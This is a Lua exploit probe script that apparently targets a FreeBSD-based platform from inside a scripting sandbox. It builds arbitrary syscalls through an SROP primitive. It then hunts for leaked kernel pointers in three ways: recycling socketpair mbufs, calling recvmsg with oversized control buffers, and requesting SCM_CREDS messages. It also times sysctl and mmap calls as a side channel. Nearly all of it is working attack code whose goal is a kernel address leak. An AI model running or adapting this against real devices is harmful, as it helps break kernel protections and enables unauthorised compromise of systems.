-- CRASH_CLASS: LOW
-- PROBE 140d: Uninitialized kernel memory via mbuf/socket recycling
--
-- Strategy: Create many socketpairs, write/read data, and check for
-- residual kernel data in mbuf chains. Also try recvmsg with oversized
-- cmsg buffers to catch uninitialized control message data.
-- Also: clock_gettime via SROP for timing infrastructure.

print("=== PROBE 140d: MBUF RESIDUE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: Clock infrastructure via SROP
-- clock_gettime(232) with CLOCK_MONOTONIC=4 or CLOCK_MONOTONIC_PRECISE=11
--------------------------------------------------------------------
print("")
print("--- [A] clock_gettime ---")
local ts_buf = gpu + 0x100
zero(ts_buf, 16)
local rv_cg = srop(232, uint64(4), ua(ts_buf))  -- CLOCK_MONOTONIC
local cgh, cgl = get_hi_lo(rv_cg)
if cgl == 0 and cgh == 0 then
    local sec = safe_rq(ts_buf)
    local nsec = safe_rq(ts_buf + 8)
    print(string.format("[A] CLOCK_MONOTONIC: sec=%s nsec=%s", hex(sec), hex(nsec)))
end
-- Precise clock
zero(ts_buf, 16)
rv_cg = srop(232, uint64(11), ua(ts_buf))  -- CLOCK_MONOTONIC_PRECISE
cgh, cgl = get_hi_lo(rv_cg)
if cgl == 0 and cgh == 0 then
    local sec = safe_rq(ts_buf)
    local nsec = safe_rq(ts_buf + 8)
    print(string.format("[A] CLOCK_PRECISE: sec=%s nsec=%s", hex(sec), hex(nsec)))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: Socket buffer recycling — mbuf residue attack
-- Create many socketpairs, close them, create new ones.
-- The new sockets' internal mbufs might have residual kernel data.
--------------------------------------------------------------------
print("")
print("--- [B] mbuf residue ---")

-- Phase 1: Churn mbufs — create and destroy many socketpairs
local sv_buf = gpu + 0x200
local churn_count = 0
for i = 1, 30 do
    zero(sv_buf, 8)
    local rv = srop(135, uint64(1), uint64(0x20000001), uint64(0), ua(sv_buf))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        local s0 = to_num(memory.read_dword(sv_buf))
        local s1 = to_num(memory.read_dword(sv_buf + 4))
        if s0 > 0 and s0 < 256 and s1 > 0 and s1 < 256 then
            churn_count = churn_count + 1
            srop(6, uint64(s0))
            srop(6, uint64(s1))
        end
    end
end
print("[B] churned " .. churn_count .. " socketpairs")

-- Phase 2: Create a fresh socketpair and do recvmsg with oversized cmsg buffer
zero(sv_buf, 8)
local rv_sp = srop(135, uint64(1), uint64(0x20000001), uint64(0), ua(sv_buf))
local sph, spl = get_hi_lo(rv_sp)
local sv0 = to_num(memory.read_dword(sv_buf))
local sv1 = to_num(memory.read_dword(sv_buf + 4))
print("[B] socketpair: " .. sv0 .. "," .. sv1)

if sv0 > 0 and sv0 < 256 and sv1 > 0 and sv1 < 256 then
    -- Write a small message
    local msg = gpu + 0x300
    for i = 0, 7 do memory.write_byte(msg + i, 0x41 + i) end -- ABCDEFGH
    local rv_wr = srop(4, uint64(sv1), ua(msg), uint64(8))
    print("[B] write=" .. hex(rv_wr))

    -- recvmsg with oversized control message buffer
    -- struct msghdr: msg_name(8), msg_namelen(4), pad(4),
    --               msg_iov(8), msg_iovlen(4), pad(4),
    --               msg_control(8), msg_controllen(4), pad(4),
    --               msg_flags(4)
    local msghdr = gpu + 0x400
    local iov = gpu + 0x500
    local data_buf = gpu + 0x600
    local cmsg_buf = gpu + 0x1000

    -- Fill cmsg buffer with marker pattern
    for off = 0, 0x3FF, 4 do
        memory.write_dword(cmsg_buf + off, 0xCAFEBABE)
    end

    -- Set up iov
    zero(data_buf, 0x200)
    memory.write_qword(iov, ua(data_buf))  -- iov_base
    memory.write_qword(iov + 8, uint64(0x200))  -- iov_len

    -- Set up msghdr
    zero(msghdr, 0x40)
    memory.write_qword(msghdr + 0x00, uint64(0))  -- msg_name = NULL
    memory.write_dword(msghdr + 0x08, 0)  -- msg_namelen = 0
    memory.write_qword(msghdr + 0x10, ua(iov))  -- msg_iov
    memory.write_dword(msghdr + 0x18, 1)  -- msg_iovlen = 1 (FreeBSD: 4 bytes, not 8)
    memory.write_qword(msghdr + 0x20, ua(cmsg_buf))  -- msg_control
    memory.write_dword(msghdr + 0x28, 0x400)  -- msg_controllen = 1024

    -- recvmsg(27) with MSG_DONTWAIT=0x80
    local rv_rm = srop(27, uint64(sv0), ua(msghdr), uint64(0x80))
    local rmh, rml = get_hi_lo(rv_rm)
    print("[B] recvmsg=" .. hex(rv_rm))

    -- Check cmsg buffer for kernel residue
    local cmsg_dirty = 0
    for off = 0, 0x3FF, 8 do
        local v = safe_rq(cmsg_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            -- Check for non-marker values
            if vl ~= 0xCAFEBABE or vh ~= 0xCAFEBABE then
                if vh ~= 0xCAFEBABE and vl ~= 0xCAFEBABE then
                    cmsg_dirty = cmsg_dirty + 1
                    if cmsg_dirty <= 10 then
                        print(string.format("[B] cmsg+0x%03X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[B] *** KPTR cmsg+0x%03X: %s ***", off, hex(v)))
                    end
                end
            end
        end
    end
    print("[B] cmsg dirty qwords=" .. cmsg_dirty)

    -- Check data buffer for anything unexpected
    local data_dirty = 0
    for off = 8, 0x1FF, 8 do  -- skip first 8 bytes (our ABCDEFGH)
        local v = safe_rq(data_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                data_dirty = data_dirty + 1
                if data_dirty <= 5 then
                    print(string.format("[B] data+0x%03X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[B] *** KPTR data+0x%03X: %s ***", off, hex(v)))
                end
            end
        end
    end
    print("[B] data dirty=" .. data_dirty)

    srop(6, uint64(sv0))
    srop(6, uint64(sv1))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: SCM_CREDS — ask kernel to attach credential info to a message
-- SOL_SOCKET=0xFFFF, SCM_CREDS=3, LOCAL_CREDS=2
-- Set LOCAL_CREDS on receiving socket, then recvmsg to get kernel-sent cmsg
--------------------------------------------------------------------
print("")
print("--- [C] SCM_CREDS ---")
zero(sv_buf, 8)
rv_sp = srop(135, uint64(1), uint64(0x20000001), uint64(0), ua(sv_buf))
sv0 = to_num(memory.read_dword(sv_buf))
sv1 = to_num(memory.read_dword(sv_buf + 4))
print("[C] socketpair: " .. sv0 .. "," .. sv1)

if sv0 > 0 and sv0 < 256 and sv1 > 0 and sv1 < 256 then
    -- Set LOCAL_CREDS on receiving end
    local one_buf = gpu + 0x300
    memory.write_dword(one_buf, 1)
    local rv_so = srop(105, uint64(sv0), uint64(0), uint64(2), ua(one_buf), uint64(4))
    print("[C] setsockopt(LOCAL_CREDS)=" .. hex(rv_so))

    -- Write message from other end
    for i = 0, 7 do memory.write_byte(gpu + 0x310 + i, 0x58 + i) end
    srop(4, uint64(sv1), ua(gpu + 0x310), uint64(8))

    -- Set up recvmsg with large control buffer
    local msghdr = gpu + 0x400
    local iov = gpu + 0x500
    local data_buf = gpu + 0x600
    local cmsg_buf = gpu + 0x1000
    zero(cmsg_buf, 0x400)
    zero(data_buf, 0x100)
    memory.write_qword(iov, ua(data_buf))
    memory.write_qword(iov + 8, uint64(0x100))
    zero(msghdr, 0x40)
    memory.write_qword(msghdr + 0x10, ua(iov))
    memory.write_dword(msghdr + 0x18, 1)
    memory.write_qword(msghdr + 0x20, ua(cmsg_buf))
    memory.write_dword(msghdr + 0x28, 0x400)

    local rv_rm = srop(27, uint64(sv0), ua(msghdr), uint64(0x80))
    print("[C] recvmsg=" .. hex(rv_rm))
    local ctrl_len = to_num(memory.read_dword(msghdr + 0x28))
    print("[C] msg_controllen=" .. ctrl_len)

    -- Dump all cmsg data
    if ctrl_len > 0 then
        print("[C] cmsg data:")
        for off = 0, math.min(ctrl_len, 0x100) - 1, 8 do
            local v = safe_rq(cmsg_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("[C]   cmsg+0x%02X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("[C] *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end

    srop(6, uint64(sv0))
    srop(6, uint64(sv1))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: Timing side channel — measure sysctl execution times
-- Use clock_gettime before/after sysctl calls to detect timing diffs
--------------------------------------------------------------------
print("")
print("--- [D] Timing side channel ---")
local ts1 = gpu + 0x3000
local ts2 = gpu + 0x3010
local mib = gpu + 0x3100
local outbuf = gpu + 0x4000
local oldlenp = gpu + 0x3200

-- Baseline: time a known-working sysctl
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 4) -- kern.version
local times = {}
for i = 1, 20 do
    zero(ts1, 16)
    zero(ts2, 16)
    srop(232, uint64(11), ua(ts1))
    zero(outbuf, 0x100)
    memory.write_dword(oldlenp, 0x100)
    memory.write_dword(oldlenp + 4, 0)
    srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    srop(232, uint64(11), ua(ts2))
    local ns1 = safe_rq(ts1 + 8)
    local ns2 = safe_rq(ts2 + 8)
    if ns1 and ns2 then
        local _, n1 = get_hi_lo(ns1)
        local _, n2 = get_hi_lo(ns2)
        local diff = n2 - n1
        if diff < 0 then diff = diff + 1000000000 end
        times[#times + 1] = diff
    end
end
if #times > 0 then
    table.sort(times)
    print(string.format("[D] sysctl timing: min=%d median=%d max=%d ns (n=%d)",
        times[1], times[math.floor(#times/2)+1], times[#times], #times))
end

-- Now time different operations and compare
-- Time mmap+munmap vs sysctl vs getpid
local mmap_times = {}
for i = 1, 10 do
    zero(ts1, 16)
    zero(ts2, 16)
    srop(232, uint64(11), ua(ts1))
    local mv = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    srop(232, uint64(11), ua(ts2))
    local ns1 = safe_rq(ts1 + 8)
    local ns2 = safe_rq(ts2 + 8)
    if ns1 and ns2 then
        local _, n1 = get_hi_lo(ns1)
        local _, n2 = get_hi_lo(ns2)
        local diff = n2 - n1
        if diff < 0 then diff = diff + 1000000000 end
        mmap_times[#mmap_times + 1] = diff
    end
    -- Unmap
    local mvh, mvl = get_hi_lo(mv)
    if mvl > 0 and mvh < 0x80000000 then
        srop(73, mv, uint64(0x4000))
    end
end
if #mmap_times > 0 then
    table.sort(mmap_times)
    print(string.format("[D] mmap timing: min=%d median=%d max=%d ns",
        mmap_times[1], mmap_times[math.floor(#mmap_times/2)+1], mmap_times[#mmap_times]))
end
print("[D] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
